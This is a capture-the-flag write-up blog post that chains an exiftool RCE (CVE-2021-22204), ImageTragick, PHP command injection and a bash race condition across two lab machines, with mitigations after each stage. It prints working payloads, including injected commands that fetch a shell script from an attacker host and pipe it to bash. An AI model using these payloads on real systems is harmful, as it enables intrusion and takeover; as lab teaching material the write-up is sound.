---
title: MystikoCTF Writeup
date: 2021-12-7 00:00:00 +0000
categories: [Linux, CTF, Privilege Escalation, Writeups]
tags: [linux, ctf, writeups, oscp]
toc: true
published: true
---

# Mystiko CTF Writeup
[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Ffredd%2Eie%2Fposts%2Fmystiko-writeup)](https://fredd.ie/posts/mystiko-writeup) 

                        



This is the writeup for the main challenge I rooted in Mystiko CTF. 

> Scoring for this CTF was slightly odd: 
> Each flag was worth 100 points, and up to 400 points would be awarded for the writeup. As there were only 6 flags available (5 of which I scored), the writeups were a pretty crucial section, so I've spent a lot of time waffling and explaining *every* little step. 
> Additionally, due to time restrictions in the competition this is barely checked for grammar/technical issues.
> 
> That being said, I'm still posting this one to hopefully inspire some people to realise if a skid like me can do this, then they can too. 



## Pixel - Initial Machine

### Initial Foothold

![](/assets/images/mystiko/mystiko-1.png)

As per usual, we start off the challenge with a basic `nmap` scan, to enumerate what open ports are on the machine. 

There are only two services publicly available:
- SSH (22)
- HTTP (8080)

We can visit the HTTP server on port 8080, and start manually playing with the application in order to see what it actually does.  

![](/assets/images/mystiko/mystiko-2.png)

It seems we can upload images, then play with some image filters and settings. 

![](/assets/images/mystiko/mystiko-3.png)

My immediate conclusion was that this must be a file upload vulnerability, and that I could inject something into the filename and that'd be that.

With the wonderful ability of hindsight, I can tell you that no, not only is this further from the truth, there are also no hidden directories of files on the webserver.

6 hours and 2 million words fuzzed later (I would not recommend doing this on an actual penetration test), my previous self came to the same conclusion. 
<br>

It was only after a significant break, and a *little* time spent banging my head against a hard wall, I noticed something strange.

![](/assets/images/mystiko/mystiko-4.png)

When a file is uploaded, there is a hidden element in the source code. 

```
 10.61
image/jpeg
25 kB
349x480
```

In fact, this looked rather familiar:

![](/assets/images/mystiko/mystiko-5.png)

Could it perhaps be data from the tool `exiftool`, and that number at the top was the exiftool version?!

With just one small Google search, we can discover that yes, there is an exiftool version named 10.61, and better still ***there's a public exploit for it***

![](/assets/images/mystiko/mystiko-6.png)

https://github.com/se162xg/CVE-2021-22204


As the webserver returns very little feedback, we can locally install the exiftool version, then run the exploits against it. 


![](/assets/images/mystiko/mystiko-7.png)


https://github.com/exiftool/exiftool/releases/tag/10.61

To do so, we must first create a docker instance, to isolate the exiftool version, and just make things easier to work with generally:

```bash
docker run -v ~/Documents/THM/Mystiko/exif_exploit:/mnt/exploit -it debian bash
```

We can also create a shared volume, so that transferring malicious payloads between the docker image, and main host is easy. 

The following script initializes the docker container, and installs the exploit and necessary tools.

```bash
apt update
apt install git -y
apt install bc -y

cd /mnt/exploit
git clone https://github.com/se162xg/CVE-2021-22204.git
cd CVE-2021-22204

sed -i 's/sudo//g' craft_a_djvu_exploit.sh
```

The following script then installs the exploitable exiftool version. 

```bash
cd /mnt
apt install wget -y
wget https://github.com/exiftool/exiftool/archive/refs/tags/10.61.tar.gz
tar xzvf 10.61.tar.gz
cd exiftool-10.61
perl Makefile.PL
./exiftool
```

![](/assets/images/mystiko/mystiko-8.png)

We can give the exploit a test run by generating the basic image payload with the command `id`, then running exiftool against the generated image.  

![](/assets/images/mystiko/mystiko-9.png)

It works!
We have the local exploit running, now all that is needed is to run it remotely, should be easy right...
<br>

```bash
bash craft_a_djvu_exploit.sh "/usr/bin/wget http://10.2.76.47"
```

However, when uploading the generated file from the above command, our HTTP server receives nothing. 

![](/assets/images/mystiko/mystiko-10.png)
<br>


We don't know if the code is being executed properly, or if the requests are just being caught by a firewall, so let's see if we can send ICMP (ping) packets through, as they're less often restricted by firewalls (in boot2root machines, that is).

```bash
bash craft_a_djvu_exploit.sh "ping -c 2 10.2.76.47"
```

![](/assets/images/mystiko/mystiko-11.png)

Our `tcpdump` picks up ICMP packets being sent from the server, so our code is being executed remotely!

![](/assets/images/mystiko/mystiko-12.png)

After a lot of enumeration, and having no luck getting other payloads to work, I resort to a boolean enumeration method. 

In bash `&&` operator will only execute the second command, if the first command completes.

```bash
which curl && ping -c 2 10.2.76.47
```

So if `curl` is installed, the machine will ping us. Using this method, we can slowly exfiltrate information about the system. 

Due to some weird voodoo magic, echoing strings, writing to files and using special characters like `>` and `<` breaks the command. 
This means we can't echo base64 strings into files, which makes it significantly harder to transfer files.
<br>

Fortunately, we still have access to the upload file functionality of the web application. 
If we can find the `uploads` directory, we can upload scripts to aid our remote code execution. 

We could use our incredibly slow and inefficient method of blindly searching for the directory, or we could use some *slightly* cursed CTF tactics. 
<br>

You can take a guess which option I went with.

![](/assets/images/mystiko/mystiko-13.png)

On the challenge author's github, there is a (now deleted) repository containing the password protected source code of the application.

Despite our best efforts cracking the password, we are unable to view the source.
This doesn't mean it is completely useless, however.

When we try to unzip the file we can see some very useful information:

![](/assets/images/mystiko/mystiko-14.png)

This not only shows me it is a python web application running (most likely using flask), but also that the uploads are stored in /static/uploads.

As a Flask web application simply routes the directory locations, when you achieve remote code execution you simply end up in the root of the application - the same directory that contains the python server file (in this case: pixel.py).

To confirm that we are actually in the root of the application, we can run the following remotely:

```bash
ls pixel.py && ping -c 2 10.2.76.47
```

Fortunately, we receive two ping packets confirming this. 

However, due to some shenanigans in the cursed code execution, we cannot simply `cat static/uploads/[file]`, but instead have to change directories, then read the file. 

Additionally, when trying to `cd` into `static/uploads`, it appears to not exist, but we **can** `cd` into `s*/uploads`. 

Sometimes, it's simply best to not ask questions as to why, and hope you don't get hurt anymore. 

I'll let the timestamps talk for themselves on this one, really.
![](/assets/images/mystiko/mystiko-15.png)
![](/assets/images/mystiko/mystiko-16.png)
<br>

*Swiftly* moving on, we now have access to our uploaded files. 
This means we can uploads bash scripts to be executed, then run them remotely. 


Using our elegant, efficient, and definitely not broken bash script `aios.sh`, we can quickly grab a reverse shell:


![](/assets/images/mystiko/mystiko-17.png)

We can upload the `shell.jpg` file to the server, to store it in the uploads directory.

Then to call our reverse shell payload, we simply generate a new malicious image using:

```bash
bash craft_a_djvu_exploit.sh "cd s*/uploads && bash shell.jpg"
```
and upload the generated `delicate.jpg` payload to the web application...

![](/assets/images/mystiko/mystiko-18.png)

Voila - we have a shell!

Let's stabilise this shell using the following:

```bash
$ python3 -c "import pty;pty.spawn('/bin/bash')"
<Ctrl + Z>
> stty raw -echo
> fg
<ENTER>
<ENTER>
$ export TERM=xterm
```

### Privilege Escalation

One of the lowest hanging fruit is checking if the current user has any special abilities set in the sudoers file. We can do this using `sudo -l`

![](/assets/images/mystiko/mystiko-19.png)

Luckily, the user not only has the ability to run `/usr/bin/pixel` as root, but also without a password!

![](/assets/images/mystiko/mystiko-20.png)

When researching the `convert` program, we are taken to the ImageMagick suite of tools. 

After a little more research, it appears the ImageMagick suite is vulnerable to an exploit aptly named ImageTragick.

Using the proof of concept found here: https://rhinosecuritylabs.com/research/imagemagick-exploit-remediation/, we can create our exploit.

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"| [command]")'
pop graphic-context
```


Once again, using the oh-so-useful AllinOneShell (aios.sh) script, we can create another reverse shell payload.

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"| wget -O - http://10.2.76.47:8000/shell.sh | bash")'
pop graphic-context
```

![](/assets/images/mystiko/mystiko-21.png)

We get a root shell!

It's now important to set up persistence so we don't have to repeat the exploitation everytime we need a shell. 
<br>

### Persistence

*Note: please don't use these persistence methods in a real life engagement.*

When initially scanning the machine, we can see that the SSH service is running.
We can gain root persistence easily using this service.

By default, root SSH login is disabled in the sshd configuration file (`/etc/ssh/sshd_config`), so we must first enable it. 


![](/assets/images/mystiko/mystiko-22.png)

To put these changes into effect, we must restart the `ssh` service:

![](/assets/images/mystiko/mystiko-23.png)

Nice, we can now login as root, so don't have to worry about the god-awful webapp ever again. 


### Vulnerability Mitigations

It's important to know how to be able to mitigate the vulnerabilities you are exploiting.

Fortunately for the development team at Mystiko, it's really not too hard to fix. 

#### Foothold
The current version of exiftool at writing (12.36) is not vulnerable to CVE-2021-22204. This means by simply updating exiftool: `sudo apt install libimage-exiftool-perl`, the vulnerability would be patched. 
Another positive is that the file upload functionality has undergone *extensive* testing, to which it has stood up to completely. 
Beers should definitely be bought for the developers because of that one. 

#### Privesc
Similarly, the vulnerability exploited in the privilege escalation phase can also be patched by simply updating the software.
`/usr/bin/convert` is part of the ImageMagick suite of tools, so to fix:

```bash
sudo apt install imagemagick
```

It is also worth considering why the user `pixel` needs access to run the `/usr/bin/pixel` program as root, and why they do not even need their own password to do so. 
<br>
<br>

## Pivoting

Having access to SSH as root simplifies the pivoting process greatly.

We can start by downloading a static `nmap` binary from https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap.

We can then upload this binary to the machine using SCP, this will help us greatly.

![](/assets/images/mystiko/mystiko-24.png)

In the `ip` information, we can our internal IP is `172.19.0.4`.

![](/assets/images/mystiko/mystiko-25.png)

We could scan the subnet, looking for other active hosts with the command:
```bash
./nmap 172.19.0.1/16 -T4 -v
```

However, the `/16` subnet is rather large for our purposes, with **65534** hosts.

To save time, we can take an educated guess, and assume that if our IP address is `172.19.0.4`, that there will be other machines at `172.19.0.3` and `172.19.0.2`.

Using our machine as our pivot point, we can use nmap to scan these two discovered hosts. 

![](/assets/images/mystiko/mystiko-26.png)
![](/assets/images/mystiko/mystiko-27.png)

<br>
<br>

## Dev01 - Internal machine


### Initial Foothold

For the first machine we scan, we can see the host name is `dev01.ctf_default`. This suggests that we should target this machine first, as it is the next challenge. 
<br>

The web server (port 80) running on `dev01` looks very interesting, so we need to employ a tactic called port forwarding to do so. 

Fortunately for us, SSH is running, so we can use this to tunnel the webserver to our local IP address. 

```bash
ssh -L 127.0.0.1:9001:172.19.0.3:80 root@10.10.167.211
```

This means if we visit port `9000` on our localhost, we will be able to reach the internal webserver.
 
![](/assets/images/mystiko/mystiko-28.png)
 
 Like most web applications, we can start by scanning for directories using tools such as `gobuster`.
 
```bash
$ gobuster dir -u http://127.0.0.1:9001 -w /opt/raft-small-words.txt
[...]
/developer            (Status: 301) [Size: 317] [--> http://127.0.0.1:9001/developer/]
```

![](/assets/images/mystiko/mystiko-29.png)


![](/assets/images/mystiko/mystiko-30.png)

A couple of key bits of information stick out to me:
-> `repo` : A git repository?
-> `epicdev420` : A unique username we haven't seen before

Using this information, we can try perform some basic osint, and discover https://github.com/epicdev420.

![](/assets/images/mystiko/mystiko-31.png)

Our lucky guess is confirmed by the repository name: `Mystikocon2021ishere`.

![](/assets/images/mystiko/mystiko-32.png)

We can pull this repository, then extract the `rar` file, to acquire the source code for `/developer`:

![](/assets/images/mystiko/mystiko-33.png)

There is one file that stands out to me in particular: `filechecker.php`.

Within that one file, one line stands out even more:

![](/assets/images/mystiko/mystiko-34.png)

The filename is not being parsed correctly, so this application may be vulnerable to command injection!

![](/assets/images/mystiko/mystiko-35.png)

When we visit the page, it seems we have the option to upload a file. 
Let's upload a file normally, then proxy the request through burpsuite. 

We can send the request to the Repeater tab using `Ctrl + R`. 

![](/assets/images/mystiko/mystiko-36.png)

To break out of the echo command, we must inject a payload such as follows:

```bash
nice'; command #'
```

This would make the command passed to `shell_exec()` as follows:

```bash
echo 'nice'; command # >> test.txt
```

![](/assets/images/mystiko/mystiko-37.png)

We can see this command injection works beautifully, if we inject the command `sleep 10` the server takes over 11 seconds to respond. 

However, there's one small caveat when trying to gain a reverse shell - the special character `/` would crash the application. 

This was quite a pain, but like always, we Tried Harder™.

We could make a curl request to a listener set up on the first machine we compromised (Pixel) using the filename: `nice'; curl 172.19.0.4:8000 #`


![](/assets/images/mystiko/mystiko-38.png)


By default, curl tries to return the `index.html` page. If we move our `shell.sh` file to `index.html`, when curl retrieves the root of the webserver (index.html), it will grab our shell.sh file. 


![](/assets/images/mystiko/mystiko-39.png)

Then if we set up our reverse shell listener (on the compromised Pixel machine, to save us having to remote port forward), curl the webserver once more, then pipe it to bash instead:

```bash
nice'; curl 172.19.0.4:8000|bash #
```

![](/assets/images/mystiko/mystiko-40.png)

It works!!

We've got a foothold on the second machine. 

### Lateral Movement

When briefly enumerating the machine manually, we can see that there is one non-admin user: `pixel`.

This is odd, as there was also a user named `pixel` on the initial machine. After a little more manual enumeration, I wondered, "could they be the same user, with the same password?". 

This led me down the unfortunate rabbit hole of attempting to crack the bcrypt password of the `pixel` user on the first machine (from /etc/shadow). Unfortunately for me and my CPU, this was to no avail.

However, while searching on initial machine a little more, I did discover that the `/root/.bash_history` file was not linked to /dev/null like usual. This means any commands root previously ran were saved to this file. 

![](/assets/images/mystiko/mystiko-41.png)

At the very top of this file is one *very* interesting entry.
```bash
ssh pixel@dev01trunm90874RR                                                
```

It's almost like the user was trying to login to the `pixel` account on dev01, and "accidentally" pasted the password in the terminal instead.

Using this password `trunm90874RR`, we can login to the pixel account on dev01 from www-data. 

![](/assets/images/mystiko/mystiko-42.png)

We can now read /home/pixel/local.txt, for the third flag. 

### Privilege Escalation

Generally speaking on boot2root machines, if you have a user's password and are trying to privesc, the first thing you should check is sudoers.

![](/assets/images/mystiko/mystiko-43.png)

This allows us to execute the script as root, without even needing a password. 

![](/assets/images/mystiko/mystiko-44.png)

`/opt/back.sh` seems a custom created script, and the `pixel` user only has the read permission set. 

When reading this file however, it seems oddly familiar somehow...

Due to my lack of social life, I recognised this file from the HTB machine Tenet, which I completed a few months ago. It essentially exploits a race condition in bash, so that we can overwrite a temporary file, while the root `/opt/back.sh` is using it. 

https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#shell-as-root

I'll let the notorious 0xdf explain this one in greater depth, as it seems only fair considering I used his script.

It's worth noting there are one or two slight changes in the new script:

```bash
mystiko=$(/usr/bin/mktemp -u /tmp/mystiko-XXXXXX)
/usr/bin/touch $mystiko;/usr/bin/chmod 777 $mystiko
/usr/bin/echo "backup root public key...."
/usr/bin/echo "[normal key]" > $mystiko
/usr/bin/cat $mystiko > /root/.ssh/authorized_keys
/usr/bin/sleep 1
/usr/bin/echo "backup done."
/usr/bin/rm $mystiko
```

So we will adapt the exploit script to overwrite all temporary files by the name of `/tmp/mystiko-*`. 

```bash
while true; do for file in /tmp/mystiko-*; do echo "[public key from 1st machine: /root/.ssh/id_rsa.pub]" > $file; done; done
```

Running the above bash script from a separate terminal, when we execute `sudo /opt/back.sh`, our public key gets inserted instead of the default key. 

This allows the `root` user on the first machine to SSH into `dev01` without need of a password.

![](/assets/images/mystiko/mystiko-45.png)

From here, all we need to do is read the flag in `/root/proof.txt` to finish the machine.

### Vulnerability Mitigations

#### Foothold
The best advice to fix the code injection vulnerability is to remove the `shell_exec` function with the user input completely.

Instead, try something similar to:
```php
$myfile = fopen("test.txt", "a+");
fwrite($myfile, $file_name);
fclose($myfile);
```

This should have exactly the same effect as the previous `shell_exec` function.

It is also worth noting the the filename, filetype and file size are reflected back to us improperly. This means we can inject arbitrary HTML code in either of the variables, and achieve Cross-site scripting (XSS). 

To prevent this, the server should use the `htmlspecialchars()` function any any user supplied input. 

#### Lateral Movement
To prevent attacks gleaming sensitive information from the history files, you can link them to /dev/null, so no commands are stored. 

```bash
ln -sf /dev/null /root/.bash_history
```

Additionally, it is recommended all users regularly update their passwords. 
It was noted in /etc/login.defs, that the password expiration policy date was set to 99999 days, so the passwords would virtually never have to be reset. 

#### Privesc
Once again, it is questioned whether the user should have the sudo permissions on the backup file. 
To prevent a race condition, the line `chmod 777 $mystiko` should be removed.
This would only allow the bash script to write to the temporary file, and would prevent exploitation in the manner previously described. 

## Flags
### Pixel
![](/assets/images/mystiko/mystiko-46.png)
### Dev01
![](/assets/images/mystiko/mystiko-47.png)

- mystikoctf{8377e3e0acca54f1da34e40f028fabe5}
- mystikoctf{3e3ed005320d4c091009e1d235fc9656}
- mystikoctf{8c1b2bfba98e077b3ae19a30f52cb1df}
- mystikoctf{8e805100ea1837d41032a796fc179020}

<br>

## Conclusion

Thanks for making it to the end of this writeup.

I was fortunate enough to win the CTF, and consequently win the OSCP voucher.
So if you read through this writeup, and understood all the content, you too could win an OSCP voucher!

I'm currently working on a post to help beginners get started learning hacking for free (it can't get more clickbaity than this right), and hopefully I should cover some tactics for winning these CTFs that aren't just "Get Good"

As you can see from the below screenshot, there were only **5** competitors so if this doesn't prove this was 99% luck I don't know what will. 

![](/assets/images/mystiko/mystiko-48.png)